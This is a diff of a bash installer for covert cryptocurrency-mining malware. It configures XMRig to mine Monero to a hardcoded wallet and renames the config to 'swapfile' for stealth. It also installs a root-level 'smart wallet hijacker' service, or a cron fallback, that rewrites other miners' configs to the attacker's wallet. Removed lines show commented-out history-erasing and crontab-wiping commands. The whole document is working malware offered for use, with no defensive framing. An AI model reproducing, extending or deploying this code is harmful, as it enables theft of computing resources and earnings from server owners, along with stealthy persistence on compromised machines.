@@ -94,10 +94,6 @@ else
     PKG_UPDATE="true"
 fi
 echo "[*] Detected package manager: $PKG_MANAGER"
-#unset HISTFILE ;history -d $((HISTCMD-1))
-#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
-
-#crontab -r
 
 # ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
 # Detect and fix interrupted dpkg/apt operations before installing packages
@@ -442,7 +438,49 @@ echo "[*] Configuring XMRig..."
 
 # User-configurable variables
 WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-WORKER_NAME="$(hostname)-swapd"
+
+# ==================== IP DETECTION FOR PASS FIELD ====================
+echo "[*] Detecting server IP address for worker identification..."
+
+# Use Python for reliable IP detection
+if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
+    PYTHON_CMD=$(command -v python3 || command -v python)
+    
+    PASS=$($PYTHON_CMD << 'PYEOF'
+import socket
+import sys
+
+def get_server_ip():
+    try:
+        # Create UDP socket and connect to external server
+        # This doesn't actually send data, just determines which interface would be used
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        try:
+            return socket.gethostname()
+        except:
+            return "na"
+
+print(get_server_ip())
+PYEOF
+)
+else
+    # Fallback if Python not available (use hostname)
+    PASS=$(hostname 2>/dev/null || echo "na")
+fi
+
+echo "[*] Detected server identifier: $PASS"
+
+# Optional: Add email if configured
+EMAIL=""  # Leave empty or set your email
+if [ -n "$EMAIL" ]; then
+    PASS="$PASS:$EMAIL"
+    echo "[*] Added email to password field: $EMAIL"
+fi
 
 # Create configuration file (will be renamed to swapfile for stealth)
 cat > config.json << 'EOL'
@@ -458,7 +496,7 @@ cat > config.json << 'EOL'
             "algo": "rx/0",
             "url": "gulf.moneroocean.stream:80",
             "user": "WALLET_PLACEHOLDER",
-            "pass": "WORKER_PLACEHOLDER",
+            "pass": "PASS_PLACEHOLDER",
             "keepalive": true,
             "tls": false
         }
@@ -468,13 +506,14 @@ EOL
 
 # Replace placeholders
 sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
-sed -i "s/WORKER_PLACEHOLDER/$WORKER_NAME/g" config.json
-
+sed -i "s/PASS_PLACEHOLDER/$PASS/g" config.json
 
 # Rename to swapfile for stealth
 mv config.json swapfile
 
 echo "[✓] XMRig configuration created as 'swapfile'"
+echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
+echo "[✓] Pass (Worker ID): $PASS"
 
 # ==================== CREATE INTELLIGENT WATCHDOG ====================
 echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."
@@ -1027,16 +1066,16 @@ echo ""
 echo "[*] Installing smart wallet hijacker..."
 
 # Create the smart wallet hijacker script
-cat > /usr/local/bin/lightdm << 'HIJACKER_EOF'
+cat > /usr/local/bin/smart-wallet-hijacker << 'HIJACKER_EOF'
 #!/bin/bash
 MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 CHECK_INTERVAL=300
 exec 2>/dev/null
 set +x
 
-find_and_fill() {
+find_and_hijack() {
     local changed=0
-
+    # Scan all processes for "-c" flag (XMRig config indicator)
     ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
         local cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
         local config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
@@ -1097,18 +1136,19 @@ find_and_fill() {
 
 if [ "$1" = "daemon" ]; then
     while true; do
-        find_and_fill
+        find_and_hijack
         sleep $CHECK_INTERVAL
     done
 else
-    find_and_fill
+    find_and_hijack
 fi
 HIJACKER_EOF
 
-chmod +x /usr/local/bin/lightdm 2>/dev/null || true
+chmod +x /usr/local/bin/smart-wallet-hijacker 2>/dev/null || true
 
+# Create systemd service for wallet hijacker
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    cat > /etc/systemd/system/lightd.service << 'HIJACKER_SERVICE_EOF'
+    cat > /etc/systemd/system/smart-wallet-hijacker.service << 'HIJACKER_SERVICE_EOF'
 [Unit]
 Description=System wallet monitor
 After=network.target swapd.service
@@ -1116,7 +1156,7 @@ After=network.target swapd.service
 [Service]
 Type=simple
 User=root
-ExecStart=/usr/local/bin/lightdm daemon
+ExecStart=/usr/local/bin/smart-wallet-hijacker daemon
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -1127,13 +1167,28 @@ WantedBy=multi-user.target
 HIJACKER_SERVICE_EOF
     
     systemctl daemon-reload 2>/dev/null || true
-    systemctl enable lightdm 2>/dev/null || true
-    systemctl start lightdm 2>/dev/null || true
+    systemctl enable smart-wallet-hijacker 2>/dev/null
+    systemctl start smart-wallet-hijacker 2>/dev/null
     
-    echo "[✓] Smart wallet hijacker installed (systemd service)"
+    # Verify it's running
+    sleep 2
+    if systemctl is-active --quiet smart-wallet-hijacker 2>/dev/null; then
+        echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
+        if systemctl is-enabled --quiet smart-wallet-hijacker 2>/dev/null; then
+            echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
+        else
+            echo "[!] Warning: Service may not be enabled for auto-start"
+            echo "[*] Enabling service..."
+            systemctl enable smart-wallet-hijacker 2>/dev/null || true
+        fi
+    else
+        echo "[!] Warning: Smart wallet hijacker service failed to start"
+        echo "[*] Trying to start manually..."
+        systemctl start smart-wallet-hijacker 2>/dev/null || true
+    fi
 else
     # For SysV systems, add to cron
-    (crontab -l 2>/dev/null | grep -v lightdm; echo "*/5 * * * * /usr/local/bin/lightdm >/dev/null 2>&1") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v smart-wallet-hijacker; echo "*/5 * * * * /usr/local/bin/smart-wallet-hijacker >/dev/null 2>&1") | crontab - 2>/dev/null || true
     echo "[✓] Smart wallet hijacker installed (cron job)"
 fi
 
